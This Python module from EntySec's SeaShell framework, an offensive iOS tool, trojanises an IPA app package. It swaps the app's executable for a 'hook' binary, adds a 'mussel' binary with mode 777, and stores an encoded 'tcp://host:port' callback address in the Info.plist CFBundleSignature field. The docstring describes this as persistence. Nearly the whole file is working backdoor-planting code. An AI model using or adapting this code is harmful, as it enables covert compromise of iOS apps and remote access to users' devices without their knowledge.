"""
MIT License

Copyright (c) 2020-2024 EntySec

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all
copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
SOFTWARE.
"""

import os
import shutil
import plistlib
import tempfile
import zipfile

from typing import Optional

from alive_progress import alive_bar
from pex.string import String

from seashell.lib.config import Config


def _safe_extract_zip(archive_path: str, extract_dir: str) -> None:
    base = os.path.realpath(extract_dir)
    with zipfile.ZipFile(archive_path) as zf:
        for member in zf.namelist():
            target = os.path.realpath(os.path.join(base, member))
            if not target.startswith(base + os.sep):
                raise RuntimeError("Unsafe path in archive")
        zf.extractall(extract_dir)


def _sanitize_executable(name: str) -> str:
    if not name or name in ('.', '..'):
        return ''
    if os.path.sep in name or (os.path.altsep and os.path.altsep in name):
        return ''
    if '..' in name:
        return ''
    return name


class Hook(Config):
    """ Subclass of seashell.core module.

    This subclass of seashell.core module is intended for providing
    an implementation a persistence for a poor man.
    """

    def __init__(self, host: Optional[str] = None,
                 port: Optional[int] = None) -> None:
        """ Initialize device hook.

        :param Optional[str] host: host
        :param Optional[int] port: port
        :return None: None
        """

        if host and port:
            self.hash = String().base64_string(
                f'tcp://{host}:{str(port)}', decode=True)
        else:
            self.hash = ''

        self.main = self.data_path + 'hook'
        self.mussel = self.data_path + 'Mussel.app/mussel'

    def patch_ipa(self, path: str) -> None:
        """ Patch existing IPA.

        :param str path: path to IPA file
        :return None: None
        """

        with alive_bar(monitor=False, stats=False, ctrl_c=False, receipt=False,
                       title="Patching {}".format(path)) as _:
            with tempfile.TemporaryDirectory() as tmp_dir:
                _safe_extract_zip(path, tmp_dir)
                payload = os.path.join(tmp_dir, 'Payload')

                if not os.path.isdir(payload):
                    return

                app_files = [file for file in os.listdir(payload) if file.endswith('.app')]
                if not app_files:
                    return

                bundle = os.path.join(payload, app_files[0])
                plist_path = os.path.join(bundle, 'Info.plist')
                executable = self.get_executable(plist_path)

                if not executable:
                    return

                self.patch_plist(plist_path)

                shutil.move(
                    os.path.join(bundle, executable),
                    os.path.join(bundle, executable + '.hooked')
                )
                shutil.copy(self.main, os.path.join(bundle, executable))
                shutil.copy(self.mussel, os.path.join(bundle, 'mussel'))

                os.chmod(os.path.join(bundle, executable), 0o777)
                os.chmod(os.path.join(bundle, 'mussel'), 0o777)

                os.remove(path)
                shutil.make_archive(path, 'zip', tmp_dir, 'Payload')
                shutil.move(path + '.zip', path)

    @staticmethod
    def get_executable(path: str) -> str:
        """ Get CFBundleExecutable path from plist.

        :param str path: path to plist to parse
        :return str: content of CFBundleExecutable
        """

        with open(path, 'rb') as f:
            plist_data = plistlib.load(f)

        if 'CFBundleExecutable' in plist_data:
            return _sanitize_executable(plist_data['CFBundleExecutable'])

        return ''

    def patch_plist(self, path: str, revert: bool = False) -> None:
        """ Patch plist file and insert object.

        :param str path: path to plist to patch
        :param bool revert: revert
        :return None: None
        """

        with open(path, 'rb') as f:
            plist_data = plistlib.load(f)

        if not revert:
            plist_data['CFBundleSignature'] = self.hash
        else:
            plist_data['CFBundleSignature'] = '????'

        with open(path, 'wb') as f:
            plistlib.dump(plist_data, f)
